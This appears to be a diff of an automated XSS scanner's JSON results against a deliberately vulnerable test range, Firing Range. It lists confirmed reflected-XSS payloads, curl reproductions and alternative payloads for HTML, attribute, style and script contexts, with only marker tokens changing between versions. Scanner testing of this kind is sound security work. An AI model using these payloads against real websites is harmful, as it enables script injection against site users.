-        "<img src=x onerror=alert('sv14efa7873')>sv14efa7873",
-        "<script>alert('sv14efa7873')</script>sv14efa7873",
-        "sv14efa7873\"><svg/onload=alert('sv14efa7873')>",
-        "sv14efa7873'><svg/onload=alert('sv14efa7873')>",
-        "sv14efa7873</title><svg/onload=alert('sv14efa7873')>"
+        "<img src=x onerror=alert('sv1987f9add')>sv1987f9add",
+        "<script>alert('sv1987f9add')</script>sv1987f9add",
+        "sv1987f9add\"><svg/onload=alert('sv1987f9add')>",
+        "sv1987f9add'><svg/onload=alert('sv1987f9add')>",
+        "sv1987f9add</title><svg/onload=alert('sv1987f9add')>"
       ]
     },
     {
@@ -434,20 +434,20 @@
       "url": "https://public-firing-range.appspot.com/reflected/parameter/body_comment",
       "method": "GET",
       "param": "q",
-      "payload": "sv1393c3c6d--><svg/onload=alert('sv1393c3c6d')>",
+      "payload": "sv1fc8f72af--><svg/onload=alert('sv1fc8f72af')>",
       "confidence": "CONFIRMED",
-      "evidence": "executed in chromium: alert:sv1393c3c6d",
+      "evidence": "executed in chromium: alert:sv1fc8f72af",
       "technique": "reflected/comment",
       "detail": "inside an HTML comment | proof: alert fired",
-      "artifact": "fr-artifacts-1.2.0/xss-01.png",
-      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/body_comment?q=sv1393c3c6d--%3E%3Csvg%2Fonload%3Dalert%28%27sv1393c3c6d%27%29%3E'",
+      "artifact": "fr-artifacts-1.2.1/xss-01.png",
+      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/body_comment?q=sv1fc8f72af--%3E%3Csvg%2Fonload%3Dalert%28%27sv1fc8f72af%27%29%3E'",
       "data": {},
       "alternatives": [
-        "sv1393c3c6d--><img src=x onerror=alert('sv1393c3c6d')>",
-        "sv1393c3c6d\"><svg/onload=alert('sv1393c3c6d')>",
-        "sv1393c3c6d'><svg/onload=alert('sv1393c3c6d')>",
-        "sv1393c3c6d</title><svg/onload=alert('sv1393c3c6d')>",
-        "sv1393c3c6d<img src=x onerror=alert('sv1393c3c6d')>"
+        "sv1fc8f72af--><img src=x onerror=alert('sv1fc8f72af')>",
+        "sv1fc8f72af\"><svg/onload=alert('sv1fc8f72af')>",
+        "sv1fc8f72af'><svg/onload=alert('sv1fc8f72af')>",
+        "sv1fc8f72af</title><svg/onload=alert('sv1fc8f72af')>",
+        "sv1fc8f72af<img src=x onerror=alert('sv1fc8f72af')>"
       ]
     },
     {
@@ -456,20 +456,20 @@
       "url": "https://public-firing-range.appspot.com/reflected/parameter/css_style",
       "method": "GET",
       "param": "q",
-      "payload": "</style><svg/onload=alert('sv1616251dd')>",
+      "payload": "</style><svg/onload=alert('sv13da9ed44')>",
       "confidence": "CONFIRMED",
-      "evidence": "executed in chromium: alert:sv1616251dd",
+      "evidence": "executed in chromium: alert:sv13da9ed44",
       "technique": "reflected/raw",
       "detail": "inside <style> raw text | proof: alert fired",
-      "artifact": "fr-artifacts-1.2.0/xss-22.png",
-      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/css_style?q=%3C%2Fstyle%3E%3Csvg%2Fonload%3Dalert%28%27sv1616251dd%27%29%3E'",
+      "artifact": "fr-artifacts-1.2.1/xss-21.png",
+      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/css_style?q=%3C%2Fstyle%3E%3Csvg%2Fonload%3Dalert%28%27sv13da9ed44%27%29%3E'",
       "data": {},
       "alternatives": [
-        "</style><img src=x onerror=alert('sv1616251dd')>",
-        "</style><script>alert('sv1616251dd')</script>",
-        "sv1616251dd\"><svg/onload=alert('sv1616251dd')>",
-        "sv1616251dd'><svg/onload=alert('sv1616251dd')>",
-        "sv1616251dd</title><svg/onload=alert('sv1616251dd')>"
+        "</style><img src=x onerror=alert('sv13da9ed44')>",
+        "</style><script>alert('sv13da9ed44')</script>",
+        "sv13da9ed44\"><svg/onload=alert('sv13da9ed44')>",
+        "sv13da9ed44'><svg/onload=alert('sv13da9ed44')>",
+        "sv13da9ed44</title><svg/onload=alert('sv13da9ed44')>"
       ]
     },
     {
@@ -478,20 +478,20 @@
       "url": "https://public-firing-range.appspot.com/reflected/parameter/css_style_font_value",
       "method": "GET",
       "param": "q",
-      "payload": "</style><svg/onload=alert('sv145288640')>",
+      "payload": "</style><svg/onload=alert('sv1711cc141')>",
       "confidence": "CONFIRMED",
-      "evidence": "executed in chromium: alert:sv145288640",
+      "evidence": "executed in chromium: alert:sv1711cc141",
       "technique": "reflected/raw",
       "detail": "inside <style> raw text | proof: alert fired",
-      "artifact": "fr-artifacts-1.2.0/xss-23.png",
-      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/css_style_font_value?q=%3C%2Fstyle%3E%3Csvg%2Fonload%3Dalert%28%27sv145288640%27%29%3E'",
+      "artifact": "fr-artifacts-1.2.1/xss-22.png",
+      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/css_style_font_value?q=%3C%2Fstyle%3E%3Csvg%2Fonload%3Dalert%28%27sv1711cc141%27%29%3E'",
       "data": {},
       "alternatives": [
-        "</style><img src=x onerror=alert('sv145288640')>",
-        "</style><script>alert('sv145288640')</script>",
-        "sv145288640\"><svg/onload=alert('sv145288640')>",
-        "sv145288640'><svg/onload=alert('sv145288640')>",
-        "sv145288640</title><svg/onload=alert('sv145288640')>"
+        "</style><img src=x onerror=alert('sv1711cc141')>",
+        "</style><script>alert('sv1711cc141')</script>",
+        "sv1711cc141\"><svg/onload=alert('sv1711cc141')>",
+        "sv1711cc141'><svg/onload=alert('sv1711cc141')>",
+        "sv1711cc141</title><svg/onload=alert('sv1711cc141')>"
       ]
     },
     {
@@ -500,20 +500,20 @@
       "url": "https://public-firing-range.appspot.com/reflected/parameter/css_style_value",
       "method": "GET",
       "param": "q",
-      "payload": "</style><svg/onload=alert('sv197265859')>",
+      "payload": "</style><svg/onload=alert('sv1c4b5276e')>",
       "confidence": "CONFIRMED",
-      "evidence": "executed in chromium: alert:sv197265859",
+      "evidence": "executed in chromium: alert:sv1c4b5276e",
       "technique": "reflected/raw",
       "detail": "inside <style> raw text | proof: alert fired",
-      "artifact": "fr-artifacts-1.2.0/xss-21.png",
-      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/css_style_value?q=%3C%2Fstyle%3E%3Csvg%2Fonload%3Dalert%28%27sv197265859%27%29%3E'",
+      "artifact": "fr-artifacts-1.2.1/xss-23.png",
+      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/css_style_value?q=%3C%2Fstyle%3E%3Csvg%2Fonload%3Dalert%28%27sv1c4b5276e%27%29%3E'",
       "data": {},
       "alternatives": [
-        "</style><img src=x onerror=alert('sv197265859')>",
-        "</style><script>alert('sv197265859')</script>",
-        "sv197265859\"><svg/onload=alert('sv197265859')>",
-        "sv197265859'><svg/onload=alert('sv197265859')>",
-        "sv197265859</title><svg/onload=alert('sv197265859')>"
+        "</style><img src=x onerror=alert('sv1c4b5276e')>",
+        "</style><script>alert('sv1c4b5276e')</script>",
+        "sv1c4b5276e\"><svg/onload=alert('sv1c4b5276e')>",
+        "sv1c4b5276e'><svg/onload=alert('sv1c4b5276e')>",
+        "sv1c4b5276e</title><svg/onload=alert('sv1c4b5276e')>"
       ]
     },
     {
@@ -522,20 +522,20 @@
       "url": "https://public-firing-range.appspot.com/reflected/parameter/form",
       "method": "POST",
       "param": "q",
-      "payload": "<svg/onload=alert('sv17d9ba4ed')>sv17d9ba4ed",
+      "payload": "<svg/onload=alert('sv131cf5e1c')>sv131cf5e1c",
       "confidence": "CONFIRMED",
-      "evidence": "executed in chromium: alert:sv17d9ba4ed",
+      "evidence": "executed in chromium: alert:sv131cf5e1c",
       "technique": "reflected/text",
       "detail": "in HTML text flow | proof: alert fired",
-      "artifact": "fr-artifacts-1.2.0/xss-38.png",
-      "curl": "curl -sS -X POST --data-urlencode 'q=<svg/onload=alert('\"'\"'sv17d9ba4ed'\"'\"')>sv17d9ba4ed' https://public-firing-range.appspot.com/reflected/parameter/form",
+      "artifact": "fr-artifacts-1.2.1/xss-38.png",
+      "curl": "curl -sS -X POST --data-urlencode 'q=<svg/onload=alert('\"'\"'sv131cf5e1c'\"'\"')>sv131cf5e1c' https://public-firing-range.appspot.com/reflected/parameter/form",
       "data": {},
       "alternatives": [
-        "<img src=x onerror=alert('sv17d9ba4ed')>sv17d9ba4ed",
-        "<script>alert('sv17d9ba4ed')</script>sv17d9ba4ed",
-        "sv17d9ba4ed\"><svg/onload=alert('sv17d9ba4ed')>",
-        "sv17d9ba4ed'><svg/onload=alert('sv17d9ba4ed')>",
-        "sv17d9ba4ed</title><svg/onload=alert('sv17d9ba4ed')>"
+        "<img src=x onerror=alert('sv131cf5e1c')>sv131cf5e1c",
+        "<script>alert('sv131cf5e1c')</script>sv131cf5e1c",
+        "sv131cf5e1c\"><svg/onload=alert('sv131cf5e1c')>",
+        "sv131cf5e1c'><svg/onload=alert('sv131cf5e1c')>",
+        "sv131cf5e1c</title><svg/onload=alert('sv131cf5e1c')>"
       ]
     },
     {
@@ -544,20 +544,20 @@
       "url": "https://public-firing-range.appspot.com/reflected/parameter/head",
       "method": "GET",
       "param": "q",
-      "payload": "<svg/onload=alert('sv14860395b')>sv14860395b",
+      "payload": "<svg/onload=alert('sv1c7b70f81')>sv1c7b70f81",
       "confidence": "CONFIRMED",
-      "evidence": "executed in chromium: alert:sv14860395b",
+      "evidence": "executed in chromium: alert:sv1c7b70f81",
       "technique": "reflected/text",
       "detail": "in HTML text flow | proof: alert fired",
-      "artifact": "fr-artifacts-1.2.0/xss-03.png",
-      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/head?q=%3Csvg%2Fonload%3Dalert%28%27sv14860395b%27%29%3Esv14860395b'",
+      "artifact": "fr-artifacts-1.2.1/xss-04.png",
+      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/head?q=%3Csvg%2Fonload%3Dalert%28%27sv1c7b70f81%27%29%3Esv1c7b70f81'",
       "data": {},
       "alternatives": [
-        "<img src=x onerror=alert('sv14860395b')>sv14860395b",
-        "<script>alert('sv14860395b')</script>sv14860395b",
-        "sv14860395b\"><svg/onload=alert('sv14860395b')>",
-        "sv14860395b'><svg/onload=alert('sv14860395b')>",
-        "sv14860395b</title><svg/onload=alert('sv14860395b')>"
+        "<img src=x onerror=alert('sv1c7b70f81')>sv1c7b70f81",
+        "<script>alert('sv1c7b70f81')</script>sv1c7b70f81",
+        "sv1c7b70f81\"><svg/onload=alert('sv1c7b70f81')>",
+        "sv1c7b70f81'><svg/onload=alert('sv1c7b70f81')>",
+        "sv1c7b70f81</title><svg/onload=alert('sv1c7b70f81')>"
       ]
     },
     {
@@ -566,20 +566,20 @@
       "url": "https://public-firing-range.appspot.com/reflected/parameter/iframe_attribute_value",
       "method": "GET",
       "param": "q",
-      "payload": "sv190cadefb' srcdoc=\"<script>alert('sv190cadefb')</script>\"",
+      "payload": "sv1d0693b16' srcdoc=\"<script>alert('sv1d0693b16')</script>\"",
       "confidence": "CONFIRMED",
-      "evidence": "executed in chromium: alert:sv190cadefb",
+      "evidence": "executed in chromium: alert:sv1d0693b16",
       "technique": "reflected/attr",
       "detail": "inside <iframe> attribute attribute (single quoted) | proof: alert fired",
-      "artifact": "fr-artifacts-1.2.0/xss-15.png",
-      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/iframe_attribute_value?q=sv190cadefb%27+srcdoc%3D%22%3Cscript%3Ealert%28%27sv190cadefb%27%29%3C%2Fscript%3E%22'",
+      "artifact": "fr-artifacts-1.2.1/xss-15.png",
+      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/iframe_attribute_value?q=sv1d0693b16%27+srcdoc%3D%22%3Cscript%3Ealert%28%27sv1d0693b16%27%29%3C%2Fscript%3E%22'",
       "data": {},
       "alternatives": [
-        "sv190cadefb' src=\"data:text/html,<script>alert('sv190cadefb')</script>\"",
-        "sv190cadefb'><svg/onload=alert(\"sv190cadefb\")>",
-        "sv190cadefb\"><svg/onload=alert('sv190cadefb')>",
-        "sv190cadefb'><svg/onload=alert('sv190cadefb')>",
-        "sv190cadefb</title><svg/onload=alert('sv190cadefb')>"
+        "sv1d0693b16' src=\"data:text/html,<script>alert('sv1d0693b16')</script>\"",
+        "sv1d0693b16'><svg/onload=alert(\"sv1d0693b16\")>",
+        "sv1d0693b16\"><svg/onload=alert('sv1d0693b16')>",
+        "sv1d0693b16'><svg/onload=alert('sv1d0693b16')>",
+        "sv1d0693b16</title><svg/onload=alert('sv1d0693b16')>"
       ]
     },
     {
@@ -588,20 +588,20 @@
       "url": "https://public-firing-range.appspot.com/reflected/parameter/iframe_srcdoc",
       "method": "GET",
       "param": "q",
-      "payload": "<svg/onload=alert('sv1b18de114')>",
+      "payload": "<svg/onload=alert('sv1f78b6399')>",
       "confidence": "CONFIRMED",
-      "evidence": "executed in chromium: alert:sv1b18de114",
+      "evidence": "executed in chromium: alert:sv1f78b6399",
       "technique": "reflected/attr",
       "detail": "inside <iframe> attribute srcdoc (double quoted) | proof: alert fired",
-      "artifact": "fr-artifacts-1.2.0/xss-16.png",
-      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/iframe_srcdoc?q=%3Csvg%2Fonload%3Dalert%28%27sv1b18de114%27%29%3E'",
+      "artifact": "fr-artifacts-1.2.1/xss-16.png",
+      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/iframe_srcdoc?q=%3Csvg%2Fonload%3Dalert%28%27sv1f78b6399%27%29%3E'",
       "data": {},
       "alternatives": [
-        "<img src=x onerror=alert('sv1b18de114')>",
-        "\"><svg/onload=alert('sv1b18de114')>",
-        "sv1b18de114\"><svg/onload=alert('sv1b18de114')>",
-        "sv1b18de114'><svg/onload=alert('sv1b18de114')>",
-        "sv1b18de114</title><svg/onload=alert('sv1b18de114')>"
+        "<img src=x onerror=alert('sv1f78b6399')>",
+        "\"><svg/onload=alert('sv1f78b6399')>",
+        "sv1f78b6399\"><svg/onload=alert('sv1f78b6399')>",
+        "sv1f78b6399'><svg/onload=alert('sv1f78b6399')>",
+        "sv1f78b6399</title><svg/onload=alert('sv1f78b6399')>"
       ]
     },
     {
@@ -610,20 +610,20 @@
       "url": "https://public-firing-range.appspot.com/reflected/parameter/js_assignment",
       "method": "GET",
       "param": "q",
-      "payload": "0;alert('sv14c633fb4')//sv14c633fb4",
+      "payload": "0;alert('sv1191ad412')//sv1191ad412",
       "confidence": "CONFIRMED",
-      "evidence": "executed in chromium: alert:sv14c633fb4",
+      "evidence": "executed in chromium: alert:sv1191ad412",
       "technique": "reflected/script",
       "detail": "inside a <script> block (code) | proof: alert fired",
-      "artifact": "fr-artifacts-1.2.0/xss-25.png",
-      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/js_assignment?q=0%3Balert%28%27sv14c633fb4%27%29%2F%2Fsv14c633fb4'",
+      "artifact": "fr-artifacts-1.2.1/xss-25.png",
+      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/js_assignment?q=0%3Balert%28%27sv1191ad412%27%29%2F%2Fsv1191ad412'",
       "data": {},
       "alternatives": [
-        "sv14c633fb4;alert('sv14c633fb4')//",
-        "sv14c633fb4</script><svg/onload=alert('sv14c633fb4')>",
-        "0;alert('sv14c633fb4');sv14c633fb4//",
-        "sv14c633fb4\"><svg/onload=alert('sv14c633fb4')>",
-        "sv14c633fb4'><svg/onload=alert('sv14c633fb4')>"
+        "sv1191ad412;alert('sv1191ad412')//",
+        "sv1191ad412</script><svg/onload=alert('sv1191ad412')>",
+        "0;alert('sv1191ad412');sv1191ad412//",
+        "sv1191ad412\"><svg/onload=alert('sv1191ad412')>",
+        "sv1191ad412'><svg/onload=alert('sv1191ad412')>"
       ]
     },
     {
@@ -632,20 +632,20 @@
       "url": "https://public-firing-range.appspot.com/reflected/parameter/js_comment",
       "method": "GET",
       "param": "q",
-      "payload": "sv131a064ac*/0;alert('sv131a064ac')/*",
+      "payload": "sv129587232*/0;alert('sv129587232')/*",
       "confidence": "CONFIRMED",
-      "evidence": "executed in chromium: alert:sv131a064ac",
+      "evidence": "executed in chromium: alert:sv129587232",
       "technique": "reflected/script",
       "detail": "inside a <script> block (block comment) | proof: alert fired",
-      "artifact": "fr-artifacts-1.2.0/xss-31.png",
-      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/js_comment?q=sv131a064ac%2A%2F0%3Balert%28%27sv131a064ac%27%29%2F%2A'",
+      "artifact": "fr-artifacts-1.2.1/xss-32.png",
+      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/js_comment?q=sv129587232%2A%2F0%3Balert%28%27sv129587232%27%29%2F%2A'",
       "data": {},
       "alternatives": [
-        "sv131a064ac*/alert('sv131a064ac')/*",
-        "sv131a064ac*/</script><svg/onload=alert('sv131a064ac')>",
-        "sv131a064ac\"><svg/onload=alert('sv131a064ac')>",
-        "sv131a064ac'><svg/onload=alert('sv131a064ac')>",
-        "sv131a064ac</title><svg/onload=alert('sv131a064ac')>"
+        "sv129587232*/alert('sv129587232')/*",
+        "sv129587232*/</script><svg/onload=alert('sv129587232')>",
+        "sv129587232\"><svg/onload=alert('sv129587232')>",
+        "sv129587232'><svg/onload=alert('sv129587232')>",
+        "sv129587232</title><svg/onload=alert('sv129587232')>"
       ]
     },
     {
@@ -654,19 +654,19 @@
       "url": "https://public-firing-range.appspot.com/reflected/parameter/js_eval",
       "method": "GET",
       "param": "q",
-      "payload": "0\");alert('sv1dbc75bb6')//",
+      "payload": "0\");alert('sv1f0cef2f5')//",
       "confidence": "CONFIRMED",
-      "evidence": "executed in chromium: alert:sv1dbc75bb6",
+      "evidence": "executed in chromium: alert:sv1f0cef2f5",
       "technique": "reflected/script",
       "detail": "inside a <script> block (double) | proof: alert fired | payload 2/6",
-      "artifact": "fr-artifacts-1.2.0/xss-28.png",
-      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/js_eval?q=0%22%29%3Balert%28%27sv1dbc75bb6%27%29%2F%2F'",
+      "artifact": "fr-artifacts-1.2.1/xss-28.png",
+      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/js_eval?q=0%22%29%3Balert%28%27sv1f0cef2f5%27%29%2F%2F'",
       "data": {},
       "alternatives": [
-        "0\"];alert('sv1dbc75bb6')//",
-        "sv1dbc75bb6</script><svg/onload=alert('sv1dbc75bb6')>",
-        "sv1dbc75bb6\"><svg/onload=alert('sv1dbc75bb6')>",
-        "sv1dbc75bb6'><svg/onload=alert('sv1dbc75bb6')>"
+        "0\"];alert('sv1f0cef2f5')//",
+        "sv1f0cef2f5</script><svg/onload=alert('sv1f0cef2f5')>",
+        "sv1f0cef2f5\"><svg/onload=alert('sv1f0cef2f5')>",
+        "sv1f0cef2f5'><svg/onload=alert('sv1f0cef2f5')>"
       ]
     },
     {
@@ -675,20 +675,20 @@
       "url": "https://public-firing-range.appspot.com/reflected/parameter/js_quoted_string",
       "method": "GET",
       "param": "q",
-      "payload": "0\";alert('sv14595e91c')//",
+      "payload": "0\";alert('sv1b7db386f')//",
       "confidence": "CONFIRMED",
-      "evidence": "executed in chromium: alert:sv14595e91c",
+      "evidence": "executed in chromium: alert:sv1b7db386f",
       "technique": "reflected/script",
       "detail": "inside a <script> block (double) | proof: alert fired",
-      "artifact": "fr-artifacts-1.2.0/xss-30.png",
-      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/js_quoted_string?q=0%22%3Balert%28%27sv14595e91c%27%29%2F%2F'",
+      "artifact": "fr-artifacts-1.2.1/xss-30.png",
+      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/js_quoted_string?q=0%22%3Balert%28%27sv1b7db386f%27%29%2F%2F'",
       "data": {},
       "alternatives": [
-        "0\");alert('sv14595e91c')//",
-        "0\"];alert('sv14595e91c')//",
-        "sv14595e91c</script><svg/onload=alert('sv14595e91c')>",
-        "sv14595e91c\"><svg/onload=alert('sv14595e91c')>",
-        "sv14595e91c'><svg/onload=alert('sv14595e91c')>"
+        "0\");alert('sv1b7db386f')//",
+        "0\"];alert('sv1b7db386f')//",
+        "sv1b7db386f</script><svg/onload=alert('sv1b7db386f')>",
+        "sv1b7db386f\"><svg/onload=alert('sv1b7db386f')>",
+        "sv1b7db386f'><svg/onload=alert('sv1b7db386f')>"
       ]
     },
     {
@@ -697,20 +697,20 @@
       "url": "https://public-firing-range.appspot.com/reflected/parameter/js_singlequoted_string",
       "method": "GET",
       "param": "q",
-      "payload": "0';alert(\"sv19c682fb3\")//",
+      "payload": "0';alert(\"sv1d7153894\")//",
       "confidence": "CONFIRMED",
-      "evidence": "executed in chromium: alert:sv19c682fb3",
+      "evidence": "executed in chromium: alert:sv1d7153894",
       "technique": "reflected/script",
       "detail": "inside a <script> block (single) | proof: alert fired",
-      "artifact": "fr-artifacts-1.2.0/xss-32.png",
-      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/js_singlequoted_string?q=0%27%3Balert%28%22sv19c682fb3%22%29%2F%2F'",
+      "artifact": "fr-artifacts-1.2.1/xss-31.png",
+      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/js_singlequoted_string?q=0%27%3Balert%28%22sv1d7153894%22%29%2F%2F'",
       "data": {},
       "alternatives": [
-        "0');alert(\"sv19c682fb3\")//",
-        "0'];alert(\"sv19c682fb3\")//",
-        "sv19c682fb3</script><svg/onload=alert(\"sv19c682fb3\")>",
-        "sv19c682fb3\"><svg/onload=alert('sv19c682fb3')>",
-        "sv19c682fb3'><svg/onload=alert('sv19c682fb3')>"
+        "0');alert(\"sv1d7153894\")//",
+        "0'];alert(\"sv1d7153894\")//",
+        "sv1d7153894</script><svg/onload=alert(\"sv1d7153894\")>",
+        "sv1d7153894\"><svg/onload=alert('sv1d7153894')>",
+        "sv1d7153894'><svg/onload=alert('sv1d7153894')>"
       ]
     },
     {
@@ -719,20 +719,20 @@
       "url": "https://public-firing-range.appspot.com/reflected/parameter/js_slashquoted_string",
       "method": "GET",
       "param": "q",
-      "payload": "sv14f165a75/;alert('sv14f165a75');//",
+      "payload": "sv123b346dc/;alert('sv123b346dc');//",
       "confidence": "CONFIRMED",
-      "evidence": "executed in chromium: alert:sv14f165a75",
+      "evidence": "executed in chromium: alert:sv123b346dc",
       "technique": "reflected/script",
       "detail": "inside a <script> block (regular expression) | proof: alert fired",
-      "artifact": "fr-artifacts-1.2.0/xss-29.png",
-      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/js_slashquoted_string?q=sv14f165a75%2F%3Balert%28%27sv14f165a75%27%29%3B%2F%2F'",
+      "artifact": "fr-artifacts-1.2.1/xss-29.png",
+      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/js_slashquoted_string?q=sv123b346dc%2F%3Balert%28%27sv123b346dc%27%29%3B%2F%2F'",
       "data": {},
       "alternatives": [
-        "sv14f165a75/;alert('sv14f165a75');/*",
-        "sv14f165a75\"><svg/onload=alert('sv14f165a75')>",
-        "sv14f165a75'><svg/onload=alert('sv14f165a75')>",
-        "sv14f165a75</title><svg/onload=alert('sv14f165a75')>",
-        "sv14f165a75<img src=x onerror=alert('sv14f165a75')>"
+        "sv123b346dc/;alert('sv123b346dc');/*",
+        "sv123b346dc\"><svg/onload=alert('sv123b346dc')>",
+        "sv123b346dc'><svg/onload=alert('sv123b346dc')>",
+        "sv123b346dc</title><svg/onload=alert('sv123b346dc')>",
+        "sv123b346dc<img src=x onerror=alert('sv123b346dc')>"
       ]
     },
     {
@@ -741,20 +741,20 @@
       "url": "https://public-firing-range.appspot.com/reflected/parameter/json",
       "method": "GET",
       "param": "q",
-      "payload": "<svg/onload=alert('sv103aad3b0')>sv103aad3b0",
+      "payload": "<svg/onload=alert('sv1b388addc')>sv1b388addc",
       "confidence": "CONFIRMED",
-      "evidence": "executed in chromium: alert:sv103aad3b0",
+      "evidence": "executed in chromium: alert:sv1b388addc",
       "technique": "reflected/text",
       "detail": "in HTML text flow | proof: alert fired",
-      "artifact": "fr-artifacts-1.2.0/xss-37.png",
-      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/json?q=%3Csvg%2Fonload%3Dalert%28%27sv103aad3b0%27%29%3Esv103aad3b0'",
+      "artifact": "fr-artifacts-1.2.1/xss-37.png",
+      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/json?q=%3Csvg%2Fonload%3Dalert%28%27sv1b388addc%27%29%3Esv1b388addc'",
       "data": {},
       "alternatives": [
-        "<img src=x onerror=alert('sv103aad3b0')>sv103aad3b0",
-        "<script>alert('sv103aad3b0')</script>sv103aad3b0",
-        "sv103aad3b0\"><svg/onload=alert('sv103aad3b0')>",
-        "sv103aad3b0'><svg/onload=alert('sv103aad3b0')>",
-        "sv103aad3b0</title><svg/onload=alert('sv103aad3b0')>"
+        "<img src=x onerror=alert('sv1b388addc')>sv1b388addc",
+        "<script>alert('sv1b388addc')</script>sv1b388addc",
+        "sv1b388addc\"><svg/onload=alert('sv1b388addc')>",
+        "sv1b388addc'><svg/onload=alert('sv1b388addc')>",
+        "sv1b388addc</title><svg/onload=alert('sv1b388addc')>"
       ]
     },
     {
@@ -763,20 +763,20 @@
       "url": "https://public-firing-range.appspot.com/reflected/parameter/noscript",
       "method": "GET",
       "param": "q",
-      "payload": "</noscript><svg/onload=alert('sv19f54c4d0')>",
+      "payload": "</noscript><svg/onload=alert('sv15c30e25a')>",
       "confidence": "CONFIRMED",
-      "evidence": "executed in chromium: alert:sv19f54c4d0",
+      "evidence": "executed in chromium: alert:sv15c30e25a",
       "technique": "reflected/raw",
       "detail": "inside <noscript> raw text | proof: alert fired",
-      "artifact": "fr-artifacts-1.2.0/xss-20.png",
-      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/noscript?q=%3C%2Fnoscript%3E%3Csvg%2Fonload%3Dalert%28%27sv19f54c4d0%27%29%3E'",
+      "artifact": "fr-artifacts-1.2.1/xss-20.png",
+      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/noscript?q=%3C%2Fnoscript%3E%3Csvg%2Fonload%3Dalert%28%27sv15c30e25a%27%29%3E'",
       "data": {},
       "alternatives": [
-        "</noscript><img src=x onerror=alert('sv19f54c4d0')>",
-        "</noscript><script>alert('sv19f54c4d0')</script>",
-        "sv19f54c4d0\"><svg/onload=alert('sv19f54c4d0')>",
-        "sv19f54c4d0'><svg/onload=alert('sv19f54c4d0')>",
-        "sv19f54c4d0</title><svg/onload=alert('sv19f54c4d0')>"
+        "</noscript><img src=x onerror=alert('sv15c30e25a')>",
+        "</noscript><script>alert('sv15c30e25a')</script>",
+        "sv15c30e25a\"><svg/onload=alert('sv15c30e25a')>",
+        "sv15c30e25a'><svg/onload=alert('sv15c30e25a')>",
+        "sv15c30e25a</title><svg/onload=alert('sv15c30e25a')>"
       ]
     },
     {
@@ -785,20 +785,20 @@
       "url": "https://public-firing-range.appspot.com/reflected/parameter/style_attribute_value",
       "method": "GET",
       "param": "q",
-      "payload": "sv1b5dcc01d'></style><svg/onload=alert(\"sv1b5dcc01d\")>",
+      "payload": "sv196df1748'></style><svg/onload=alert(\"sv196df1748\")>",
       "confidence": "CONFIRMED",
-      "evidence": "executed in chromium: alert:sv1b5dcc01d",
+      "evidence": "executed in chromium: alert:sv196df1748",
       "technique": "reflected/attr",
       "detail": "inside <style> attribute attribute (single quoted) | proof: alert fired",
-      "artifact": "fr-artifacts-1.2.0/xss-18.png",
-      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/style_attribute_value?q=sv1b5dcc01d%27%3E%3C%2Fstyle%3E%3Csvg%2Fonload%3Dalert%28%22sv1b5dcc01d%22%29%3E'",
+      "artifact": "fr-artifacts-1.2.1/xss-18.png",
+      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/style_attribute_value?q=sv196df1748%27%3E%3C%2Fstyle%3E%3Csvg%2Fonload%3Dalert%28%22sv196df1748%22%29%3E'",
       "data": {},
       "alternatives": [
-        "sv1b5dcc01d'></style><img src=x onerror=alert(\"sv1b5dcc01d\")>",
-        "sv1b5dcc01d\"><svg/onload=alert('sv1b5dcc01d')>",
-        "sv1b5dcc01d'><svg/onload=alert('sv1b5dcc01d')>",
-        "sv1b5dcc01d</title><svg/onload=alert('sv1b5dcc01d')>",
-        "sv1b5dcc01d<img src=x onerror=alert('sv1b5dcc01d')>"
+        "sv196df1748'></style><img src=x onerror=alert(\"sv196df1748\")>",
+        "sv196df1748\"><svg/onload=alert('sv196df1748')>",
+        "sv196df1748'><svg/onload=alert('sv196df1748')>",
+        "sv196df1748</title><svg/onload=alert('sv196df1748')>",
+        "sv196df1748<img src=x onerror=alert('sv196df1748')>"
       ]
     },
     {
@@ -807,20 +807,20 @@
       "url": "https://public-firing-range.appspot.com/reflected/parameter/tagname",
       "method": "GET",
       "param": "q",
-      "payload": "sv1bd37afa2><svg/onload=alert('sv1bd37afa2')>",
+      "payload": "sv1fcc8388f><svg/onload=alert('sv1fcc8388f')>",
       "confidence": "CONFIRMED",
-      "evidence": "executed in chromium: alert:sv1bd37afa2",
+      "evidence": "executed in chromium: alert:sv1fcc8388f",
       "technique": "reflected/tagname",
       "detail": "as the element tag name | proof: alert fired",
-      "artifact": "fr-artifacts-1.2.0/xss-05.png",
-      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/tagname?q=sv1bd37afa2%3E%3Csvg%2Fonload%3Dalert%28%27sv1bd37afa2%27%29%3E'",
+      "artifact": "fr-artifacts-1.2.1/xss-05.png",
